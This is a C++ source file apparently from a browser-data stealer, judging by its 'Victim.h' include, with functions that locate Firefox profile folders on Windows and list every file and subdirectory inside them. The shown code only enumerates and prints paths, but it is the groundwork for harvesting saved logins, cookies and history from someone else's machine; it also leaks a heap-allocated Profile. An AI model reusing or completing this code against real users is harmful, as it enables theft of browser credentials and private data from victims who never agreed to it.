#include "Browsers.h"
#include "Victim.h"

struct ProfileDirectory {
	std::vector<std::wstring> directories;
	std::vector<std::wstring> files;
};

std::vector<Profile> Browsers::GetFirefoxProfilesList(const std::wstring& p_firefox) {
	std::vector<Profile> profileList;
	Profile* dummyProfile = new Profile;
	if (p_firefox.length() > 1) {
		DWORD fileAttribute = GetFileAttributesW(p_firefox.c_str());
		if (fileAttribute != INVALID_FILE_ATTRIBUTES && (fileAttribute & FILE_ATTRIBUTE_DIRECTORY)) {
			WIN32_FIND_DATA ffd;
			ProfileDirectory dirs;
			dirs.directories.push_back(p_firefox + L"\\*");
			HANDLE hFind = FindFirstFile(dirs.directories[0].c_str(), &ffd);
			do {
				std::wstring f = ffd.cFileName;
				if (std::wcscmp(ffd.cFileName, L".") != 0 &&
					std::wcscmp(ffd.cFileName, L"..") != 0) {
					if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						dummyProfile->profileName = ffd.cFileName;
						dummyProfile->profilePath = p_firefox + L"\\" + ffd.cFileName;
						profileList.push_back(*dummyProfile);
						//dirs.directories.push_back(p_FirefoxAppData + L"\\" + ffd.cFileName);
						std::wcout << p_firefox << L"\\" << ffd.cFileName << std::endl;
					}
				}

			} while (FindNextFile(hFind, &ffd) != 0);
		}
	}
	return profileList;
}

Profile Browsers::GetProfileContent(Profile firefoxProfiles) {
	WIN32_FIND_DATA ffd;
	std::wcout << L"GET PROFILE CONTENT : " << firefoxProfiles.profilePath << std::endl;
	if (firefoxProfiles.profilePath.empty() || firefoxProfiles.profilePath.length() < 50) throw std::exception{ "Firefox path looks wrong !" };
	else {
		DWORD fileAttribute = GetFileAttributesW(firefoxProfiles.profilePath.c_str());
		if (fileAttribute != INVALID_FILE_ATTRIBUTES && (fileAttribute & FILE_ATTRIBUTE_DIRECTORY)) { //Check that our path is a dir
			std::wstring firstFile = firefoxProfiles.profilePath + L"\\*";
			HANDLE hFind = FindFirstFile(firstFile.c_str(), &ffd);
			do {
				std::wstring f = ffd.cFileName;
				if (std::wcscmp(ffd.cFileName, L".") != 0 &&
					std::wcscmp(ffd.cFileName, L"..") != 0) {
					if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						//If file is a directory add it to the directories param
						firefoxProfiles.ProfileDirectories.push_back(ffd.cFileName);
						std::wcout << L"PATH : " << ffd.cFileName << std::endl;
					}
					else {
						std::wcout << L"FILE : " << ffd.cFileName << std::endl;
						firefoxProfiles.ProfileFiles.push_back(ffd.cFileName);
					}

				}
			} while (FindNextFile(hFind, &ffd) != 0);
		}
	}
	return firefoxProfiles;
}